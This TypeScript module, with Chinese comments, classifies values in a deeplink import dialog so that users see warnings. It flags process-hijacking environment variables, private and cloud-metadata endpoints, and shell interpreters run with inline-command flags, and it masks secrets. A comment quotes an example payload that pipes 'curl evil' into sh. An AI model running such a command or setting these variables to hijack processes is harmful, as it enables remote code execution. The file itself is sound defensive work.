// deeplink 导入确认框的取值呈现工具。
//
// 这里的所有判定**只用于 UI 提示，不参与任何拦截决策**。深链接携带的自定义
// endpoint 与 env 是第三方供应商的正常配置能力（`http://localhost:11434` 就是
// Ollama / LM Studio 的常规用法），拦下来会打断合法场景。真正的缺口是用户在
// 点「导入」时看不到自己在同意什么——所以补的是可见性，不是黑名单。

export type RiskKind = "envHijack" | "privateEndpoint" | "shellCommand";

/**
 * 能改变子进程加载行为的环境变量。
 *
 * 它们的共同点是：不影响"访问哪个 API"，而是影响"进程启动时加载什么代码 / 信任
 * 哪张证书"。没有任何合法的供应商预设需要通过分享链接设置它们。
 */
const ENV_HIJACK_PATTERNS: RegExp[] = [
  /^LD_/i, // LD_PRELOAD / LD_LIBRARY_PATH / LD_AUDIT
  /^DYLD_/i, // macOS 对应物
  /^NODE_OPTIONS$/i, // --require 任意脚本
  /^NODE_EXTRA_CA_CERTS$/i, // 注入 CA → TLS 中间人
  /^PYTHONPATH$/i,
  /^PYTHONSTARTUP$/i,
  /^RUBYOPT$/i,
  /^PERL5OPT$/i,
  /^JAVA_TOOL_OPTIONS$/i,
  /^BASH_ENV$/i,
  /^ENV$/i,
  /^IFS$/i,
  /^PATH$/i, // 整体劫持命令解析
  /^HTTPS?_PROXY$/i, // 全量流量转发
];

/** 会被 shell 解释成"执行下面这段字符串"的调用形态。 */
const SHELL_INTERPRETERS = new Set([
  "sh",
  "bash",
  "zsh",
  "dash",
  "ksh",
  "fish",
  "csh",
  "tcsh",
  "cmd",
  "cmd.exe",
  "powershell",
  "powershell.exe",
  "pwsh",
  "pwsh.exe",
]);

/**
 * 「下一个参数是要执行的命令串」这一族开关。
 *
 * 不能只比 `-c`：POSIX shell 允许把单字母开关并成一串（`bash -lc`、`sh -eco pipefail`
 * 之类），Windows 侧则是 `/c` `/k` 且大小写不敏感，PowerShell 还有 `-Command`
 * 的各种缩写。这里按形态判定而不是枚举字面量。
 */
function isInlineCommandFlag(arg: string): boolean {
  const lower = arg.toLowerCase();

  // cmd.exe：/c、/k，可带后缀（/c:）
  if (/^\/[ck]\b/.test(lower)) return true;

  // PowerShell：-Command / -c 及其任意合法缩写（-comm、-comma…）
  if (/^-c(o(m(m(a(n(d)?)?)?)?)?)?$/.test(lower)) return true;
  if (lower === "-encodedcommand" || lower === "-e" || lower === "-ec") {
    return true;
  }

  // POSIX shell：单横线 + 一串短开关，其中含 c（-c、-lc、-ec、-eco…）
  if (/^-[a-z]*c[a-z]*$/.test(lower)) return true;

  return false;
}

/**
 * 判定是否为环回 / 私网 / 云元数据地址。
 *
 * 只做**字面量**匹配，不做 DNS 解析：解析会引入超时，而且解析结果与客户端稍后
 * 实际连接时的结果可以不同（DNS rebinding），拿它当防线是虚假的确定性。作为
 * "这个地址看着像内网，你确认吗"的提示，字面量匹配已经够用。
 */
/**
 * 取出主机的 IPv4 四元组，兼容 IPv4-mapped IPv6。
 *
 * `new URL("http://[::ffff:127.0.0.1]/")` 会把主机**归一成十六进制**
 * `[::ffff:7f00:1]`，点分形式在这一步就消失了，只按 `\d+\.\d+\.\d+\.\d+`
 * 匹配会整类漏掉——`[::ffff:169.254.169.254]` 同理会绕过内网判定。
 */
function extractIpv4Octets(bare: string): [number, number] | null {
  const dotted = bare.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (dotted) return [Number(dotted[1]), Number(dotted[2])];

  // ::ffff:7f00:1 → 0x7f00 0x0001 → 127.0.0.1
  const mapped = bare.match(/^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/);
  if (mapped) {
    const high = parseInt(mapped[1], 16);
    return [(high >> 8) & 0xff, high & 0xff];
  }

  // 少数实现保留点分尾巴：::ffff:127.0.0.1
  const mappedDotted = bare.match(
    /^::ffff:(\d{1,3})\.(\d{1,3})\.\d{1,3}\.\d{1,3}$/,
  );
  if (mappedDotted) {
    return [Number(mappedDotted[1]), Number(mappedDotted[2])];
  }

  return null;
}

export function classifyEndpoint(rawUrl: unknown): RiskKind | null {
  if (typeof rawUrl !== "string") return null;

  let host: string;
  try {
    host = new URL(rawUrl).hostname.toLowerCase();
  } catch {
    return null;
  }

  // URL 会把 IPv6 主机保留在方括号里
  const bare =
    host.startsWith("[") && host.endsWith("]") ? host.slice(1, -1) : host;

  if (
    bare === "localhost" ||
    bare.endsWith(".localhost") ||
    bare.endsWith(".local") ||
    bare.endsWith(".internal") ||
    bare === "::1" ||
    bare === "::" ||
    bare === "0.0.0.0"
  ) {
    return "privateEndpoint";
  }

  const octets = extractIpv4Octets(bare);
  if (octets) {
    const [a, b] = octets;
    if (
      a === 127 || // 环回
      a === 10 || // RFC 1918
      a === 0 ||
      (a === 172 && b >= 16 && b <= 31) ||
      (a === 192 && b === 168) ||
      (a === 169 && b === 254) // 链路本地，含 AWS/GCP 元数据 169.254.169.254
    ) {
      return "privateEndpoint";
    }
  }

  // IPv6 唯一本地地址 fc00::/7 与链路本地 fe80::/10
  if (/^f[cd][0-9a-f]{2}:/.test(bare) || /^fe[89ab][0-9a-f]:/.test(bare)) {
    return "privateEndpoint";
  }

  return null;
}

export function classifyEnvKey(key: unknown): RiskKind | null {
  if (typeof key !== "string") return null;
  return ENV_HIJACK_PATTERNS.some((pattern) => pattern.test(key))
    ? "envHijack"
    : null;
}

/**
 * MCP server 的 `command` + `args`。
 *
 * 单看 `command` 完全不够：真实 payload 是 `command: "sh"` 配
 * `args: ["-c", "curl evil|sh"]`，界面上只渲染 command 时它显示成无害的 `sh`。
 *
 * 两个参数都声明成 `unknown`：它们来自深链接里 base64 解码后的任意 JSON，TS 的
 * 类型标注在这个边界上不设防。写成 `string` 而实际收到对象或数字时 `.split()`
 * 会抛错，把整个确认框炸成空白——那比显示一条误导性的 `Command: sh` 更糟，因为
 * 用户连"有东西要导入"都看不到了。
 */
export function classifyCommand(
  command: unknown,
  args?: unknown,
): RiskKind | null {
  if (typeof command !== "string" || !command) return null;

  // 只取基名：`/bin/sh` 与 `sh` 是同一回事
  const base = command.split(/[/\\]/).pop()?.toLowerCase() ?? "";
  if (!SHELL_INTERPRETERS.has(base)) return null;

  if (!Array.isArray(args)) return null;
  return args.some((arg) => typeof arg === "string" && isInlineCommandFlag(arg))
    ? "shellCommand"
    : null;
}

/**
 * 凭据类取值的展示脱敏。
 *
 * 原先是 `DeepLinkImportDialog` 内的组件闭包；MCP 确认页也要展示 env，抽出来是
 * 为了两处共用同一套规则——各写一份迟早会漂移成两种脱敏口径。
 */
export function maskValue(key: string, value: string): string {
  const sensitiveKeys = ["TOKEN", "KEY", "SECRET", "PASSWORD"];
  const isSensitive = sensitiveKeys.some((k) => key.toUpperCase().includes(k));
  if (isSensitive && value.length > 8) {
    return `${value.substring(0, 8)}${"*".repeat(12)}`;
  }
  return value;
}

/** 风险种类 → i18n key。 */
export function riskI18nKey(kind: RiskKind): string {
  return `deeplink.risk.${kind}`;
}
